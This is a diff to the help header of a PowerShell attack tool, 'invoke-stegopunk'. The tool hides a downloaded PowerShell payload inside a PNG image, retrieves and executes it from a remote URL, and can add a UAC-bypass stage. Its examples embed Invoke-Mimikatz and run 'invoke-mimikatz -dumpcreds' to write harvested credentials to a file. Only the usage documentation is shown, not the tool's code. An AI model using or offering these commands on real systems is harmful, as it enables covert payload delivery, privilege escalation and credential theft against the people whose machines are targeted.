@@ -5,15 +5,23 @@ Author: Vito De Laurentis (AKA Trust_No_1) (@Trust_No_001)
 License: GNU GPL v2
 Version: v1.0
 
+.Description
+-mode encryption  >>    Create PNG Repo File in %userprofile%\desktop\
+-mode decryption  >>    Decrypting/Execution from PNG Repo
+-b_uac "on/off"   >>    Enable/disable BypassUAC Stage
+-key              >>    Encryption/Decryption Key
+-fileurl          >>    Contain .Ps1 link (url)
+-imageurl         >>    "ENCRYPTION MODE" contain original download link image (url)
+                  >>    "DECRYPTION MODE" contain download link (REPO image link(url))
+-imagename        >>    Repo Image Name
+-Command          >>    
+
+
 .Example
 invoke-stegopunk -mode encryption -key 'Passo' -fileurl 'https:// ... download from ... /Example/Invoke-Mimikatz.ps1' -imageurl 'http://... download... image/wp-content/polignano_puglia_italy.png' -imagename 'vacanze.png'
-.Description
-Create PNG Repo File in %userprofile%\desktop\
 
 .Example
 invoke-stegopunk -mode decryption -key 'Passo' -b_uac on -imageurl 'https://example.blog....com/vacanze.png' -command 'invoke-mimikatz -dumpcreds > c:\users\v.delaurentis\desktop\vito.txt'
-.Description
-Decrypting/Execution from PNG Repo
 
 #>
 
